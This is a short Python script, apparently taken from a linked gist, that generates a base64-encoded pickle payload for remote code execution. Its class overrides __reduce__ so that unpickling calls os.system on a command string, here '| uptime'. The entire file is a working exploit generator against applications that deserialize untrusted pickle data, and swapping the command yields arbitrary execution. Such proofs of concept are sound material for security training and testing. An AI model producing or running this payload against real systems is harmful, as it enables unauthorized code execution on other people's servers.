import pickle
import sys
import base64

command = '| uptime'


class Rce(object):
    def __reduce__(self):
        import os
        return os.system, (command,)


print(base64.b64encode(pickle.dumps(Rce())))


#https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3
